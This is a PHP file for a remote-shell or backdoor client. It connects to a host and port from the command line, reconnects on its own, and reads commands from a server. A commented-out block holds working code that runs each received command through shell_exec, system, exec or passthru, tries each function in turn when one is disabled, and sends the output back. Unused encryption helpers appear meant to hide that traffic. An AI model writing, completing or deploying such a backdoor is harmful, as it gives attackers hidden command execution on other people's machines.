<?php namespace App\Client;

set_time_limit(0);
ob_implicit_flush(1);

define("BUFFER_LEN", 4096);
define('CYPHER', 'AES-256-CBC');
define('OPTIONS', OPENSSL_RAW_DATA);
define('HASH_ALGO', 'sha256');
define('HASH_LEN', 32);
define('SHA512LEN', 512);
define('ENC_AES_LEN', 684);

class ClientSocket {
    
    public static function __connect()
    {
        $opts = getopt("h:p:", ["host:", "port:"]);

        (count($opts) === 2) || die();
        $addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
        $port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
        
        ($socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) || die();
        ($result = @socket_connect($socket, $addr, $port)) || die();

        echo "[\33[91m!\33[0m] connected.\n";

        while(1)
        {
            if(($recv = @socket_read($socket, BUFFER_LEN)) === false || $recv === "")
            {
                socket_close($socket);
                echo "[\33[91m!\33[0m] disconnected.\n";
                sleep(rand(1,5));

                $socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                $result = @socket_connect($socket, $addr, $port);
                if($socket && $result){ echo "[\33[91m!\33[0m] connected.\n"; }
            }
            else
            {
          
                if(preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE))
                { break; }

                echo "Server: {$recv}\n";


                //$full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim($recv));
                /*$full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";

                if(function_exists('shell_exec')){
                    $fnc = "shell_exec()";
                    if(($result = shell_exec($full_cmd)) === null){ $result = "Error"; }
                }
                else if(function_exists('system')){
                    $fnc = "system()";
                    @ob_start();
                    if(($result = @system($full_cmd)) === false){ $result = "Error"; }
                    else { $result = @ob_get_contents(); } 		
                    @ob_end_clean(); 
                }
                else if(function_exists('exec')){ 
                    $fnc = "exec()";
                    @exec($full_cmd,$results,$ret_status);
                    if($ret_status !== 0){ $result = "Error status: ".$ret_status; }
                    else {
                        $result = ""; 		
                        foreach($results as $res){ $result .= $res."\n\r"; }
                    }
                }
                else if(function_exists('passthru')){
                    $fnc = "passthru()";
                    @ob_start(); 		
                    @passthru($full_cmd); 		
                    $result = @ob_get_contents(); 		
                    @ob_end_clean(); 
                }
                else { $result = "error:: system calls disabled."; }
                $result .= "\33[94mexec\33[0m:: {$fnc} \33[94mcmd\33[0m:: {$full_cmd}";
            
                if(socket_write($socket, $result, strlen($result)) === false) {	continue; }*/
            }
        }
        socket_close($socket);
    }

    /*********************************************************************************/

    private function decryptRSAClient($publicKey, $encryptedb64){
        if(false === ($encrypted = base64_decode($encryptedb64))){
            return false;
        }
        if(false === openssl_public_decrypt($encrypted, $decrtypted, $publicKey)){
            return false;
        }
        return $decrtypted;
    }
    private function encrypt_cbcClient($clrtext, $key){
        if($key === null){ return false; }
        $key = base64_decode($key);
        try {
            $ivlen      = openssl_cipher_iv_length(CYPHER);
            $iv         = openssl_random_pseudo_bytes($ivlen);
            $ciphertext = openssl_encrypt($clrtext, CYPHER, $key, OPTIONS, $iv);
            $hmac       = hash_hmac(HASH_ALGO, $iv.$ciphertext, $key, true);
            return base64_encode($iv.$hmac.$ciphertext);
        } catch (\Throwable $e){
            return false;
        }
        return false;
    }
    private function decrypt_cbcClient($encrypted, $key){
        if($key === null){ return false; }
        if($encrypted === false || empty($encrypted)){ return false; }
        $key = base64_decode($key);
        $encrypted = base64_decode($encrypted);
        try {
            $ivlen      = openssl_cipher_iv_length(CYPHER);
            $iv         = substr($encrypted, 0, $ivlen);
            $hmac       = substr($encrypted, $ivlen, HASH_LEN);
            $ciphertext = substr($encrypted, ($ivlen + HASH_LEN));
            $clrtext    = openssl_decrypt($ciphertext, CYPHER, $key, OPTIONS, $iv);
            if($clrtext === false){ return false; }
            $calcmac = hash_hmac(HASH_ALGO, $iv.$ciphertext, $key, true);
            if(hash_equals($hmac, $calcmac)){ return $clrtext; }
            return false;
        } catch (\Throwable $e){
            return false;
        }
        return false;
    }
}



$result = ClientSocket::__connect();

?>